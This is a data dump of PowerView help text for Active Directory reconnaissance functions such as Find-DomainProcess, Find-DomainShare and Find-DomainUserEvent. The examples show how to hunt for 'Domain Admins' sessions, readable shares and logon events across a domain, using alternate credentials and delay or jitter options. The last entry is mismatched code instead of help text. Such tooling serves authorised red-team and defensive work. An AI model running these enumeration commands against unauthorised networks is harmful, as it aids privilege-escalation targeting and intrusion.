                  '.EXAMPLE\n'
                  '\n'
                  "$SecPassword = ConvertTo-SecureString 'Password123!' "
                  '-AsPlainText -Force\n'
                  '$Cred = New-Object '
                  "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                  '$SecPassword)\n'
                  "'TESTLAB\\dfm' | ConvertTo-SID -Credential $Cred\n"
                  '\n'
                  '.INPUTS\n'
                  '\n'
                  'String\n'
                  '\n'
                  'Accepts one or more username specification strings on the '
                  'pipeline.\n'
                  '\n'
                  '.OUTPUTS\n'
                  '\n'
                  'String\n'
                  '\n'
                  'A string representing the SID of the translated name.\n',
 'Export-PowerViewCSV': '.SYNOPSIS\n'
                        '\n'
                        'Converts objects into a series of comma-separated '
                        '(CSV) strings and saves the\n'
                        'strings in a CSV file in a thread-safe manner.\n'
                        '\n'
                        'Author: Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: None  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'This helper exports an -InputObject to a .csv in a '
                        'thread-safe manner\n'
                        'using a mutex. This is so the various multi-threaded '
                        'functions in\n'
                        'PowerView has a thread-safe way to export output to '
                        'the same file.\n'
                        'Uses .NET IO.FileStream/IO.StreamWriter objects for '
                        'speed.\n'
                        '\n'
                        "Originally based on Dmitry Sotnikov's Export-CSV "
                        'code: http://poshcode.org/1590\n'
                        '\n'
                        '.PARAMETER InputObject\n'
                        '\n'
                        'Specifies the objects to export as CSV strings.\n'
                        '\n'
                        '.PARAMETER Path\n'
                        '\n'
                        'Specifies the path to the CSV output file.\n'
                        '\n'
                        '.PARAMETER Delimiter\n'
                        '\n'
                        'Specifies a delimiter to separate the property '
                        'values. The default is a comma (,)\n'
                        '\n'
                        '.PARAMETER Append\n'
                        '\n'
                        'Indicates that this cmdlet adds the CSV output to the '
                        'end of the specified file.\n'
                        'Without this parameter, Export-PowerViewCSV replaces '
                        'the file contents without warning.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainUser | Export-PowerViewCSV -Path '
                        '"users.csv"\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainUser | Export-PowerViewCSV -Path '
                        '"users.csv" -Append -Delimiter \'|\'\n'
                        '\n'
                        '.INPUTS\n'
                        '\n'
                        'PSObject\n'
                        '\n'
                        'Accepts one or more PSObjects on the pipeline.\n'
                        '\n'
                        '.LINK\n'
                        '\n'
                        'http://poshcode.org/1590\n'
                        'http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/\n',
 'Find-DomainLocalGroupMember': '.SYNOPSIS\n'
                                '\n'
                                'Enumerates the members of specified local '
                                'group (default administrators)\n'
                                'for all the targeted machines on the current '
                                '(or specified) domain.\n'
                                '\n'
                                'Author: Will Schroeder (@harmj0y)  \n'
                                'License: BSD 3-Clause  \n'
                                'Required Dependencies: Get-DomainComputer, '
                                'Invoke-UserImpersonation, '
                                'Invoke-RevertToSelf, Get-NetLocalGroupMember, '
                                'New-ThreadedFunction  \n'
                                '\n'
                                '.DESCRIPTION\n'
                                '\n'
                                'This function enumerates all machines on the '
                                'current (or specified) domain\n'
                                'using Get-DomainComputer, and enumerates the '
                                'members of the specified local\n'
                                'group (default of Administrators) for each '
                                'machine using Get-NetLocalGroupMember.\n'
                                'By default, the API method is used, but this '
                                "can be modified with '-Method winnt'\n"
                                'to use the WinNT service provider.\n'
                                '\n'
                                '.PARAMETER ComputerName\n'
                                '\n'
                                'Specifies an array of one or more hosts to '
                                'enumerate, passable on the pipeline.\n'
                                'If -ComputerName is not passed, the default '
                                'behavior is to enumerate all machines\n'
                                'in the domain returned by '
                                'Get-DomainComputer.\n'
                                '\n'
                                '.PARAMETER ComputerDomain\n'
                                '\n'
                                'Specifies the domain to query for computers, '
                                'defaults to the current domain.\n'
                                '\n'
                                '.PARAMETER ComputerLDAPFilter\n'
                                '\n'
                                'Specifies an LDAP query string that is used '
                                'to search for computer objects.\n'
                                '\n'
                                '.PARAMETER ComputerSearchBase\n'
                                '\n'
                                'Specifies the LDAP source to search through '
                                'for computers,\n'
                                'e.g. "LDAP://OU=secret,DC=testlab,DC=local". '
                                'Useful for OU queries.\n'
                                '\n'
                                '.PARAMETER ComputerOperatingSystem\n'
                                '\n'
                                'Search computers with a specific operating '
                                'system, wildcards accepted.\n'
                                '\n'
                                '.PARAMETER ComputerServicePack\n'
                                '\n'
                                'Search computers with a specific service '
                                'pack, wildcards accepted.\n'
                                '\n'
                                '.PARAMETER ComputerSiteName\n'
                                '\n'
                                'Search computers in the specific AD Site '
                                'name, wildcards accepted.\n'
                                '\n'
                                '.PARAMETER GroupName\n'
                                '\n'
                                'The local group name to query for users. If '
                                'not given, it defaults to "Administrators".\n'
                                '\n'
                                '.PARAMETER Method\n'
                                '\n'
                                'The collection method to use, defaults to '
                                "'API', also accepts 'WinNT'.\n"
                                '\n'
                                '.PARAMETER Server\n'
                                '\n'
                                'Specifies an Active Directory server (domain '
                                'controller) to bind to.\n'
                                '\n'
                                '.PARAMETER SearchScope\n'
                                '\n'
                                'Specifies the scope to search under for '
                                'computers, Base/OneLevel/Subtree (default of '
                                'Subtree).\n'
                                '\n'
                                '.PARAMETER ResultPageSize\n'
                                '\n'
                                'Specifies the PageSize to set for the LDAP '
                                'searcher object.\n'
                                '\n'
                                '.PARAMETER ServerTimeLimit\n'
                                '\n'
                                'Specifies the maximum amount of time the '
                                'server spends searching. Default of 120 '
                                'seconds.\n'
                                '\n'
                                '.PARAMETER Tombstone\n'
                                '\n'
                                'Switch. Specifies that the searcher should '
                                'also return deleted/tombstoned objects.\n'
                                '\n'
                                '.PARAMETER Credential\n'
                                '\n'
                                'A [Management.Automation.PSCredential] object '
                                'of alternate credentials\n'
                                'for connection to the target domain and '
                                'target systems.\n'
                                '\n'
                                '.PARAMETER Delay\n'
                                '\n'
                                'Specifies the delay (in seconds) between '
                                'enumerating hosts, defaults to 0.\n'
                                '\n'
                                '.PARAMETER Jitter\n'
                                '\n'
                                'Specifies the jitter (0-1.0) to apply to any '
                                'specified -Delay, defaults to +/- 0.3\n'
                                '\n'
                                '.PARAMETER Threads\n'
                                '\n'
                                'The number of threads to use for user '
                                'searching, defaults to 20.\n'
                                '\n'
                                '.EXAMPLE\n'
                                '\n'
                                'Find-DomainLocalGroupMember\n'
                                '\n'
                                'Enumerates the local group memberships for '
                                'all reachable machines in the current '
                                'domain.\n'
                                '\n'
                                '.EXAMPLE\n'
                                '\n'
                                'Find-DomainLocalGroupMember -Domain '
                                'dev.testlab.local\n'
                                '\n'
                                'Enumerates the local group memberships for '
                                'all reachable machines the dev.testlab.local '
                                'domain.\n'
                                '\n'
                                '.EXAMPLE\n'
                                '\n'
                                '$SecPassword = ConvertTo-SecureString '
                                "'Password123!' -AsPlainText -Force\n"
                                '$Cred = New-Object '
                                "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                                '$SecPassword)\n'
                                'Find-DomainLocalGroupMember -Domain '
                                'testlab.local -Credential $Cred\n'
                                '\n'
                                'Enumerates the local group memberships for '
                                'all reachable machines the dev.testlab.local\n'
                                'domain using the alternate credentials.\n'
                                '\n'
                                '.OUTPUTS\n'
                                '\n'
                                'PowerView.LocalGroupMember.API\n'
                                '\n'
                                'Custom PSObject with translated group '
                                'property fields from API results.\n'
                                '\n'
                                'PowerView.LocalGroupMember.WinNT\n'
                                '\n'
                                'Custom PSObject with translated group '
                                'property fields from WinNT results.\n',
 'Find-DomainObjectPropertyOutlier': '.SYNOPSIS\n'
                                     '\n'
                                     'Finds user/group/computer objects in AD '
                                     "that have 'outlier' properties set.\n"
                                     '\n'
                                     'Author: Will Schroeder (@harmj0y), '
                                     'Matthew Graeber (@mattifestation)  \n'
                                     'License: BSD 3-Clause  \n'
                                     'Required Dependencies: Get-Domain, '
                                     'Get-DomainUser, Get-DomainGroup, '
                                     'Get-DomainComputer\n'
                                     '\n'
                                     '.DESCRIPTION\n'
                                     '\n'
                                     "A 'reference' set of property names is "
                                     'calculated, either from a standard set '
                                     'preserved\n'
                                     'for user/group/computers, or from the '
                                     'array of names passed to '
                                     '-ReferencePropertySet, or\n'
                                     'from the property names of the passed '
                                     '-ReferenceObject. Every '
                                     'user/group/computer object\n'
                                     '(depending on determined class) are '
                                     'enumerated, and for each object, if the '
                                     'object has a\n'
                                     "'non-standard' property set (meaning a "
                                     'property not held by the reference set), '
                                     "the object's\n"
                                     'samAccountName, property name, and '
                                     'property value are output to the '
                                     'pipeline.\n'
                                     '\n'
                                     '.PARAMETER ClassName\n'
                                     '\n'
                                     'Specifies the AD object class to find '
                                     "property outliers for, 'user', 'group', "
                                     "or 'computer'.\n"
                                     'If -ReferenceObject is specified, this '
                                     'will be automatically extracted, if '
                                     'possible.\n'
                                     '\n'
                                     '.PARAMETER ReferencePropertySet\n'
                                     '\n'
                                     'Specifies an array of property names to '
                                     'diff against the class schema.\n'
                                     '\n'
                                     '.PARAMETER ReferenceObject\n'
                                     '\n'
                                     'Specicifes the PowerView '
                                     'user/group/computer object to extract '
                                     'property names\n'
                                     'from to use as the reference set.\n'
                                     '\n'
                                     '.PARAMETER Domain\n'
                                     '\n'
                                     'Specifies the domain to use for the '
                                     'query, defaults to the current domain.\n'
                                     '\n'
                                     '.PARAMETER LDAPFilter\n'
                                     '\n'
                                     'Specifies an LDAP query string that is '
                                     'used to filter Active Directory '
                                     'objects.\n'
                                     '\n'
                                     '.PARAMETER SearchBase\n'
                                     '\n'
                                     'The LDAP source to search through, e.g. '
                                     '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                     'Useful for OU queries.\n'
                                     '\n'
                                     '.PARAMETER Server\n'
                                     '\n'
                                     'Specifies an Active Directory server '
                                     '(domain controller) to bind to.\n'
                                     '\n'
                                     '.PARAMETER SearchScope\n'
                                     '\n'
                                     'Specifies the scope to search under, '
                                     'Base/OneLevel/Subtree (default of '
                                     'Subtree).\n'
                                     '\n'
                                     '.PARAMETER ResultPageSize\n'
                                     '\n'
                                     'Specifies the PageSize to set for the '
                                     'LDAP searcher object.\n'
                                     '\n'
                                     '.PARAMETER ServerTimeLimit\n'
                                     '\n'
                                     'Specifies the maximum amount of time the '
                                     'server spends searching. Default of 120 '
                                     'seconds.\n'
                                     '\n'
                                     '.PARAMETER Tombstone\n'
                                     '\n'
                                     'Switch. Specifies that the searcher '
                                     'should also return deleted/tombstoned '
                                     'objects.\n'
                                     '\n'
                                     '.PARAMETER Credential\n'
                                     '\n'
                                     'A [Management.Automation.PSCredential] '
                                     'object of alternate credentials\n'
                                     'for connection to the target domain.\n'
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     'Find-DomainObjectPropertyOutlier '
                                     "-ClassName 'User'\n"
                                     '\n'
                                     'Enumerates users in the current domain '
                                     "with 'outlier' properties filled in.\n"
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     'Find-DomainObjectPropertyOutlier '
                                     "-ClassName 'Group' -Domain "
                                     'external.local\n'
                                     '\n'
                                     'Enumerates groups in the external.local '
                                     "forest/domain with 'outlier' properties "
                                     'filled in.\n'
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     'Get-DomainComputer -FindOne | '
                                     'Find-DomainObjectPropertyOutlier\n'
                                     '\n'
                                     'Enumerates computers in the current '
                                     "domain with 'outlier' properties filled "
                                     'in.\n'
                                     '\n'
                                     '.OUTPUTS\n'
                                     '\n'
                                     'PowerView.PropertyOutlier\n'
                                     '\n'
                                     'Custom PSObject with translated object '
                                     'property outliers.\n',
 'Find-DomainProcess': '.SYNOPSIS\n'
                       '\n'
                       'Searches for processes on the domain using WMI, '
                       'returning processes\n'
                       'that match a particular user specification or process '
                       'name.\n'
                       '\n'
                       'Thanks to @paulbrandau for the approach idea.\n'
                       '\n'
                       'Author: Will Schroeder (@harmj0y)  \n'
                       'License: BSD 3-Clause  \n'
                       'Required Dependencies: Get-DomainComputer, '
                       'Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, '
                       'New-ThreadedFunction  \n'
                       '\n'
                       '.DESCRIPTION\n'
                       '\n'
                       'This function enumerates all machines on the current '
                       '(or specified) domain\n'
                       'using Get-DomainComputer, and queries the domain for '
                       'users of a specified group\n'
                       "(default 'Domain Admins') with Get-DomainGroupMember. "
                       'Then for each server the\n'
                       'function enumerates any current processes running with '
                       'Get-WMIProcess,\n'
                       'searching for processes running under any target user '
                       'contexts or with the\n'
                       'specified -ProcessName. If -Credential is passed, it '
                       'is passed through to\n'
                       'the underlying WMI commands used to enumerate the '
                       'remote machines.\n'
                       '\n'
                       '.PARAMETER ComputerName\n'
                       '\n'
                       'Specifies an array of one or more hosts to enumerate, '
                       'passable on the pipeline.\n'
                       'If -ComputerName is not passed, the default behavior '
                       'is to enumerate all machines\n'
                       'in the domain returned by Get-DomainComputer.\n'
                       '\n'
                       '.PARAMETER Domain\n'
                       '\n'
                       'Specifies the domain to query for computers AND users, '
                       'defaults to the current domain.\n'
                       '\n'
                       '.PARAMETER ComputerDomain\n'
                       '\n'
                       'Specifies the domain to query for computers, defaults '
                       'to the current domain.\n'
                       '\n'
                       '.PARAMETER ComputerLDAPFilter\n'
                       '\n'
                       'Specifies an LDAP query string that is used to search '
                       'for computer objects.\n'
                       '\n'
                       '.PARAMETER ComputerSearchBase\n'
                       '\n'
                       'Specifies the LDAP source to search through for '
                       'computers,\n'
                       'e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful '
                       'for OU queries.\n'
                       '\n'
                       '.PARAMETER ComputerUnconstrained\n'
                       '\n'
                       'Switch. Search computer objects that have '
                       'unconstrained delegation.\n'
                       '\n'
                       '.PARAMETER ComputerOperatingSystem\n'
                       '\n'
                       'Search computers with a specific operating system, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER ComputerServicePack\n'
                       '\n'
                       'Search computers with a specific service pack, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER ComputerSiteName\n'
                       '\n'
                       'Search computers in the specific AD Site name, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER ProcessName\n'
                       '\n'
                       'Search for processes with one or more specific names.\n'
                       '\n'
                       '.PARAMETER UserIdentity\n'
                       '\n'
                       'Specifies one or more user identities to search for.\n'
                       '\n'
                       '.PARAMETER UserDomain\n'
                       '\n'
                       'Specifies the domain to query for users to search for, '
                       'defaults to the current domain.\n'
                       '\n'
                       '.PARAMETER UserLDAPFilter\n'
                       '\n'
                       'Specifies an LDAP query string that is used to search '
                       'for target users.\n'
                       '\n'
                       '.PARAMETER UserSearchBase\n'
                       '\n'
                       'Specifies the LDAP source to search through for target '
                       'users.\n'
                       'e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful '
                       'for OU queries.\n'
                       '\n'
                       '.PARAMETER UserGroupIdentity\n'
                       '\n'
                       'Specifies a group identity to query for target users, '
                       "defaults to 'Domain Admins.\n"
                       'If any other user specifications are set, then '
                       'UserGroupIdentity is ignored.\n'
                       '\n'
                       '.PARAMETER UserAdminCount\n'
                       '\n'
                       "Switch. Search for users users with '(adminCount=1)' "
                       '(meaning are/were privileged).\n'
                       '\n'
                       '.PARAMETER Server\n'
                       '\n'
                       'Specifies an Active Directory server (domain '
                       'controller) to bind to.\n'
                       '\n'
                       '.PARAMETER SearchScope\n'
                       '\n'
                       'Specifies the scope to search under for computers, '
                       'Base/OneLevel/Subtree (default of Subtree).\n'
                       '\n'
                       '.PARAMETER ResultPageSize\n'
                       '\n'
                       'Specifies the PageSize to set for the LDAP searcher '
                       'object.\n'
                       '\n'
                       '.PARAMETER ServerTimeLimit\n'
                       '\n'
                       'Specifies the maximum amount of time the server spends '
                       'searching. Default of 120 seconds.\n'
                       '\n'
                       '.PARAMETER Tombstone\n'
                       '\n'
                       'Switch. Specifies that the searcher should also return '
                       'deleted/tombstoned objects.\n'
                       '\n'
                       '.PARAMETER Credential\n'
                       '\n'
                       'A [Management.Automation.PSCredential] object of '
                       'alternate credentials\n'
                       'for connection to the target domain and target '
                       'systems.\n'
                       '\n'
                       '.PARAMETER StopOnSuccess\n'
                       '\n'
                       'Switch. Stop hunting after finding after finding a '
                       'target user.\n'
                       '\n'
                       '.PARAMETER Delay\n'
                       '\n'
                       'Specifies the delay (in seconds) between enumerating '
                       'hosts, defaults to 0.\n'
                       '\n'
                       '.PARAMETER Jitter\n'
                       '\n'
                       'Specifies the jitter (0-1.0) to apply to any specified '
                       '-Delay, defaults to +/- 0.3\n'
                       '\n'
                       '.PARAMETER Threads\n'
                       '\n'
                       'The number of threads to use for user searching, '
                       'defaults to 20.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Find-DomainProcess\n'
                       '\n'
                       "Searches for processes run by 'Domain Admins' by "
                       'enumerating every computer in the domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Find-DomainProcess -UserAdminCount '
                       "-ComputerOperatingSystem 'Windows 7*' -Domain "
                       'dev.testlab.local\n'
                       '\n'
                       'Enumerates Windows 7 computers in dev.testlab.local '
                       'and returns any processes being run by\n'
                       'privileged users in dev.testlab.local.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Find-DomainProcess -ProcessName putty.exe\n'
                       '\n'
                       'Searchings for instances of putty.exe running on the '
                       'current domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       "$SecPassword = ConvertTo-SecureString 'Password123!' "
                       '-AsPlainText -Force\n'
                       '$Cred = New-Object '
                       "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                       '$SecPassword)\n'
                       'Find-DomainProcess -Domain testlab.local -Credential '
                       '$Cred\n'
                       '\n'
                       "Searches processes being run by 'domain admins' in the "
                       'testlab.local using the specified alternate '
                       'credentials.\n'
                       '\n'
                       '.OUTPUTS\n'
                       '\n'
                       'PowerView.UserProcess\n',
 'Find-DomainShare': '.SYNOPSIS\n'
                     '\n'
                     'Searches for computer shares on the domain. If '
                     '-CheckShareAccess is passed,\n'
                     'then only shares the current user has read access to are '
                     'returned.\n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: Get-DomainComputer, '
                     'Invoke-UserImpersonation, Invoke-RevertToSelf, '
                     'Get-NetShare, New-ThreadedFunction  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'This function enumerates all machines on the current (or '
                     'specified) domain\n'
                     'using Get-DomainComputer, and enumerates the available '
                     'shares for each\n'
                     'machine with Get-NetShare. If -CheckShareAccess is '
                     'passed, then\n'
                     '[IO.Directory]::GetFiles() is used to check if the '
                     'current user has read\n'
                     'access to the given share. If -Credential is passed, '
                     'then\n'
                     'Invoke-UserImpersonation is used to impersonate the '
                     'specified user before\n'
                     'enumeration, reverting after with Invoke-RevertToSelf.\n'
                     '\n'
                     '.PARAMETER ComputerName\n'
                     '\n'
                     'Specifies an array of one or more hosts to enumerate, '
                     'passable on the pipeline.\n'
                     'If -ComputerName is not passed, the default behavior is '
                     'to enumerate all machines\n'
                     'in the domain returned by Get-DomainComputer.\n'
                     '\n'
                     '.PARAMETER ComputerDomain\n'
                     '\n'
                     'Specifies the domain to query for computers, defaults to '
                     'the current domain.\n'
                     '\n'
                     '.PARAMETER ComputerLDAPFilter\n'
                     '\n'
                     'Specifies an LDAP query string that is used to search '
                     'for computer objects.\n'
                     '\n'
                     '.PARAMETER ComputerSearchBase\n'
                     '\n'
                     'Specifies the LDAP source to search through for '
                     'computers,\n'
                     'e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for '
                     'OU queries.\n'
                     '\n'
                     '.PARAMETER ComputerOperatingSystem\n'
                     '\n'
                     'Search computers with a specific operating system, '
                     'wildcards accepted.\n'
                     '\n'
                     '.PARAMETER ComputerServicePack\n'
                     '\n'
                     'Search computers with a specific service pack, wildcards '
                     'accepted.\n'
                     '\n'
                     '.PARAMETER ComputerSiteName\n'
                     '\n'
                     'Search computers in the specific AD Site name, wildcards '
                     'accepted.\n'
                     '\n'
                     '.PARAMETER CheckShareAccess\n'
                     '\n'
                     'Switch. Only display found shares that the local user '
                     'has access to.\n'
                     '\n'
                     '.PARAMETER Server\n'
                     '\n'
                     'Specifies an Active Directory server (domain controller) '
                     'to bind to.\n'
                     '\n'
                     '.PARAMETER SearchScope\n'
                     '\n'
                     'Specifies the scope to search under for computers, '
                     'Base/OneLevel/Subtree (default of Subtree).\n'
                     '\n'
                     '.PARAMETER ResultPageSize\n'
                     '\n'
                     'Specifies the PageSize to set for the LDAP searcher '
                     'object.\n'
                     '\n'
                     '.PARAMETER ServerTimeLimit\n'
                     '\n'
                     'Specifies the maximum amount of time the server spends '
                     'searching. Default of 120 seconds.\n'
                     '\n'
                     '.PARAMETER Tombstone\n'
                     '\n'
                     'Switch. Specifies that the searcher should also return '
                     'deleted/tombstoned objects.\n'
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the target domain and target systems.\n'
                     '\n'
                     '.PARAMETER Delay\n'
                     '\n'
                     'Specifies the delay (in seconds) between enumerating '
                     'hosts, defaults to 0.\n'
                     '\n'
                     '.PARAMETER Jitter\n'
                     '\n'
                     'Specifies the jitter (0-1.0) to apply to any specified '
                     '-Delay, defaults to +/- 0.3\n'
                     '\n'
                     '.PARAMETER Threads\n'
                     '\n'
                     'The number of threads to use for user searching, '
                     'defaults to 20.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Find-DomainShare\n'
                     '\n'
                     'Find all domain shares in the current domain.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Find-DomainShare -CheckShareAccess\n'
                     '\n'
                     'Find all domain shares in the current domain that the '
                     'current user has\n'
                     'read access to.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "$SecPassword = ConvertTo-SecureString 'Password123!' "
                     '-AsPlainText -Force\n'
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     'Find-DomainShare -Domain testlab.local -Credential '
                     '$Cred\n'
                     '\n'
                     'Searches for domain shares in the testlab.local domain '
                     'using the specified alternate credentials.\n'
                     '\n'
                     '.OUTPUTS\n'
                     '\n'
                     'PowerView.ShareInfo\n',
 'Find-DomainUserEvent': '.SYNOPSIS\n'
                         '\n'
                         'Finds logon events on the current (or remote domain) '
                         'for the specified users.\n'
                         '\n'
                         'Author: Lee Christensen (@tifkin_), Justin Warner '
                         '(@sixdub), Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: Get-DomainUser, '
                         'Get-DomainGroupMember, Get-DomainController, '
                         'Get-DomainUserEvent, New-ThreadedFunction  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'Enumerates all domain controllers from the specified '
                         '-Domain\n'
                         '(default of the local domain) using '
                         'Get-DomainController, enumerates\n'
                         'the logon events for each using Get-DomainUserEvent, '
                         'and filters\n'
                         'the results based on the targeting criteria.\n'
                         '\n'
                         '.PARAMETER ComputerName\n'
                         '\n'
                         'Specifies an explicit computer name to retrieve '
                         'events from.\n'
                         '\n'
                         '.PARAMETER Domain\n'
                         '\n'
                         'Specifies a domain to query for domain controllers '
                         'to enumerate.\n'
                         'Defaults to the current domain.\n'
                         '\n'
                         '.PARAMETER Filter\n'
                         '\n'
                         'A hashtable of PowerView.LogonEvent properties to '
                         'filter for.\n'
                         "The 'op|operator|operation' clause can have '&', "
                         "'|', 'and', or 'or',\n"
                         "and is 'or' by default, meaning at least one clause "
                         'matches instead of all.\n'
                         'See the exaples for usage.\n'
                         '\n'
                         '.PARAMETER StartTime\n'
                         '\n'
                         'The [DateTime] object representing the start of when '
                         'to collect events.\n'
                         'Default of [DateTime]::Now.AddDays(-1).\n'
                         '\n'
                         '.PARAMETER EndTime\n'
                         '\n'
                         'The [DateTime] object representing the end of when '
                         'to collect events.\n'
                         'Default of [DateTime]::Now.\n'
                         '\n'
                         '.PARAMETER MaxEvents\n'
                         '\n'
                         'The maximum number of events (per host) to retrieve. '
                         'Default of 5000.\n'
                         '\n'
                         '.PARAMETER UserIdentity\n'
                         '\n'
                         'Specifies one or more user identities to search '
                         'for.\n'
                         '\n'
                         '.PARAMETER UserDomain\n'
                         '\n'
                         'Specifies the domain to query for users to search '
                         'for, defaults to the current domain.\n'
                         '\n'
                         '.PARAMETER UserLDAPFilter\n'
                         '\n'
                         'Specifies an LDAP query string that is used to '
                         'search for target users.\n'
                         '\n'
                         '.PARAMETER UserSearchBase\n'
                         '\n'
                         'Specifies the LDAP source to search through for '
                         'target users.\n'
                         'e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful '
                         'for OU queries.\n'
                         '\n'
                         '.PARAMETER UserGroupIdentity\n'
                         '\n'
                         'Specifies a group identity to query for target '
                         "users, defaults to 'Domain Admins.\n"
                         'If any other user specifications are set, then '
                         'UserGroupIdentity is ignored.\n'
                         '\n'
                         '.PARAMETER UserAdminCount\n'
                         '\n'
                         "Switch. Search for users users with '(adminCount=1)' "
                         '(meaning are/were privileged).\n'
                         '\n'
                         '.PARAMETER Server\n'
                         '\n'
                         'Specifies an Active Directory server (domain '
                         'controller) to bind to.\n'
                         '\n'
                         '.PARAMETER SearchScope\n'
                         '\n'
                         'Specifies the scope to search under for computers, '
                         'Base/OneLevel/Subtree (default of Subtree).\n'
                         '\n'
                         '.PARAMETER ResultPageSize\n'
                         '\n'
                         'Specifies the PageSize to set for the LDAP searcher '
                         'object.\n'
                         '\n'
                         '.PARAMETER ServerTimeLimit\n'
                         '\n'
                         'Specifies the maximum amount of time the server '
                         'spends searching. Default of 120 seconds.\n'
                         '\n'
                         '.PARAMETER Tombstone\n'
                         '\n'
                         'Switch. Specifies that the searcher should also '
                         'return deleted/tombstoned objects.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the target computer(s).\n'
                         '\n'
                         '.PARAMETER StopOnSuccess\n'
                         '\n'
                         'Switch. Stop hunting after finding after finding a '
                         'target user.\n'
                         '\n'
                         '.PARAMETER Delay\n'
                         '\n'
                         'Specifies the delay (in seconds) between enumerating '
                         'hosts, defaults to 0.\n'
                         '\n'
                         '.PARAMETER Jitter\n'
                         '\n'
                         'Specifies the jitter (0-1.0) to apply to any '
                         'specified -Delay, defaults to +/- 0.3\n'
                         '\n'
                         '.PARAMETER Threads\n'
                         '\n'
                         'The number of threads to use for user searching, '
                         'defaults to 20.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Find-DomainUserEvent\n'
                         '\n'
                         'Search for any user events matching domain admins on '
                         'every DC in the current domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         '$cred = Get-Credential dev\\administrator\n'
                         'Find-DomainUserEvent -ComputerName '
                         "'secondary.dev.testlab.local' -UserIdentity 'john'\n"
                         '\n'
                         "Search for any user events matching the user 'john' "
                         "on the 'secondary.dev.testlab.local'\n"
                         'domain controller using the alternate credential\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "'primary.testlab.local | Find-DomainUserEvent "
                         '-Filter '
                         "@{'IpAddress'='192.168.52.200|192.168.52.201'}\n"
                         '\n'
                         'Find user events on the primary.testlab.local system '
                         'where the event matches\n'
                         "the IPAddress '192.168.52.200' or '192.168.52.201'.\n"
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         '$cred = Get-Credential testlab\\administrator\n'
                         'Find-DomainUserEvent -Delay 1 -Filter '
                         "@{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; "
                         "'TargetLogonId' = '10238128'; 'op'='&'}\n"
                         '\n'
                         'Find user events mathing the specified GUID AND the '
                         'specified TargetLogonId, searching\n'
                         'through every domain controller in the current '
                         'domain, enumerating each DC in serial\n'
                         'instead of in a threaded manner, using the alternate '
                         'credential.\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'PowerView.LogonEvent\n'
                         '\n'
                         'PowerView.ExplicitCredentialLogon\n'
                         '\n'
                         '.LINK\n'
                         '\n'
                         'http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/\n',
 'Find-DomainUserLocation': '    # Helper used by any threaded host '
                            'enumeration functions\n'
                            '    '
                            "[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', "
                            "'')]\n"
                            '    [CmdletBinding()]\n'
                            '    Param(\n'
                            '        [Parameter(Position = 0, Mandatory = '
                            '$True, ValueFromPipeline = $True, '
                            'ValueFromPipelineByPropertyName = $True)]\n'
                            '        [String[]]\n'
                            '        $ComputerName,\n'
                            '\n'
                            '        [Parameter(Position = 1, Mandatory = '
                            '$True)]\n'
                            '        '
                            '[System.Management.Automation.ScriptBlock]\n'
                            '        $ScriptBlock,\n'
                            '\n'
                            '        [Parameter(Position = 2)]\n'
                            '        [Hashtable]\n'
                            '        $ScriptParameters,\n'
                            '\n'
                            '        [Int]\n'
                            '        [ValidateRange(1,  100)]\n'
                            '        $Threads = 20,\n'
                            '\n'
                            '        [Switch]\n'
                            '        $NoImports\n'
                            '    )\n'
                            '\n'
                            '    BEGIN {\n'
                            '        # Adapted from:\n'
                            '        #   '
                            'http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/\n'
                            '        $SessionState = '
                            '[System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()\n'
                            '\n'
                            '        # # $SessionState.ApartmentState = '
                            '[System.Threading.Thread]::CurrentThread.GetApartmentState()\n'
